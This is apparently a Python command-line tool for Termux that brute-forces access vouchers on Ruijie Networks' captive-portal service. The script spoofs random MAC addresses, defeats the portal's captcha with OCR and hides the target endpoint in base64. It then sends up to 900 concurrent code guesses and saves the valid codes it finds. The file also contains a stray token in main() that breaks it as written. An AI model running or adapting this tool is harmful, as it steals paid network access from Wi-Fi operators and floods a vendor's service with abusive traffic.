#!/usr/bin/env python3
# termux_scan.py - CLI version for Termux

import asyncio
import aiohttp
import json
import base64
import random
import re
import os
import string
import time
import uuid
import argparse
import sys
import signal
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ---------- configuration ----------
CONCURRENCY = 900          # concurrent requests
BATCH_SIZE = 1000          # codes per batch
# -----------------------------------

_voucher_sem = None
_connector = None
session = None

# OCR engine (loaded once)
_ocr = ddddocr.DdddOcr(show_ad=False)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            else:
                return previous_session_id
    except:
        return previous_session_id

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        if data.get("success") == True:
            return session_id
        else:
            return None

async def perform_check(session, session_url, code):
    """
    Try one code. Returns (status, code) where status is 'success', 'limited', or None.
    """
    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    # We need an isolated session for each check to avoid captcha sharing issues.
    # But for performance, we reuse the connector.
    timeout = aiohttp.ClientTimeout(total=30)
    async with aiohttp.ClientSession(
        connector=_connector,
        connector_owner=False,
        cookie_jar=aiohttp.CookieJar(),
        timeout=timeout
    ) as task_session:
        session_id = await get_session_id(task_session, session_url, None)
        if not session_id:
            return None

        # solve captcha
        auth_code = None
        for _ in range(8):
            try:
                image = await Captcha_Image(task_session, session_id)
                text = await Captcha_Text(image)
                if not text:
                    continue
                verified = await Varify_Captcha(task_session, session_id, text)
                if verified:
                    auth_code = text
                    break
            except Exception:
                continue
        if not auth_code:
            return None

        data = {
            "accessCode": code,
            "sessionId": session_id,
            "apiVersion": 1,
            "authCode": auth_code,
        }
        headers = {
            "authority": "portal-as.ruijienetworks.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://portal-as.ruijienetworks.com",
            "referer": (
                f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
            ),
            "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        }
        try:
            async with task_session.post(post_url, json=data, headers=headers) as req:
                resp = await req.text()
                resp_json = json.loads(resp)
        except Exception:
            return None

        if 'logonUrl' in resp:
            return ('success', code)
        elif 'STA' in resp:
            return ('limited', code)
        else:
            return None

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"🔍 Scanning Codes...\n"
            f"📦 Checked: {checked:,}/{total:,}\n"
            f"📊 Progress: {percent:.2f}%\n"
            f"⚡ Speed: {speed_str}\n"
            f"[{bar}]"
        )
    else:
        return (
            f"🔍 Scanning Codes...\n"
            f"📦 Checked: {checked:,}\n"
            f"⚡ Speed: {speed_str}\n"
            f"📊 Status: running"
        )

async def run_scan(session_url, mode, output_file=None, concurrency=CONCURRENCY):
    global _voucher_sem, _connector
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(concurrency)

    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        print(f"Error: {e}")
        return

    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    success_codes = []
    limited_codes = []
    stop_flag = False

    # Signal handler for graceful stop
    def signal_handler(sig, frame):
        nonlocal stop_flag
        print("\n🛑 Stop signal received, finishing current batch...")
        stop_flag = True
    signal.signal(signal.SIGINT, signal_handler)

    try:
        while not stop_flag:
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            # Run batch concurrently
            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session, session_url, code)

            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            for idx, result in enumerate(results):
                if isinstance(result, Exception):
                    continue
                if result is None:
                    continue
                status, code = result
                if status == 'success':
                    success_codes.append(code)
                    print(f"✅ SUCCESS: {code}")
                    if output_file:
                        with open(output_file, 'a') as f:
                            f.write(f"{code}\n")
                elif status == 'limited':
                    limited_codes.append(code)
                    print(f"⚠️ LIMITED: {code}")

            checked += len(batch)

            # Progress every batch
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            progress = format_progress(checked, total, speed)
            sys.stdout.write('\r' + progress)
            sys.stdout.flush()

        # Final output
        print("\n\n" + "="*50)
        print(f"✅ Success codes found: {len(success_codes)}")
        if success_codes:
            print("\n".join(success_codes))
        print(f"\n⚠️ Limited codes: {len(limited_codes)}")
        if limited_codes:
            print("\n".join(limited_codes))
        print("="*50)

    except Exception as e:
        print(f"\n❌ Error: {e}")
    finally:
        if output_file and success_codes:
            with open(output_file, 'w') as f:
                f.write("\n".join(success_codes))
            print(f"\n✅ Success codes saved to {output_file}")

async def main():
    parser = argparse.ArgumentParser(description="Ruijie voucher scanner CLI")
    parser.add_argument("--session-url", required=True, help="Session URL (with mac and sessionId)")
    parser.add_argument("--mode", required=True, choices=['6','7','8','ascii-lower','all'], help="Scan mode")
    parser.add_argument("--output", help="File to save success codes")
    parser.add_argument("--concurrency", type=int, default=CONCURRENCY, help="Number of concurrent requests")
    args = parser.parse_args()

    global _connector, session
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(
        limit=2000,
        ttl_dns_cache=300,
        ssl=False
    )
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    ) is

    try:
        await run_scan(args.session_url, args.mode, args.output, args.concurrency)
    finally:
        await session.close()
        await _connector.close()

if __name__ == "__main__":
    asyncio.run(main())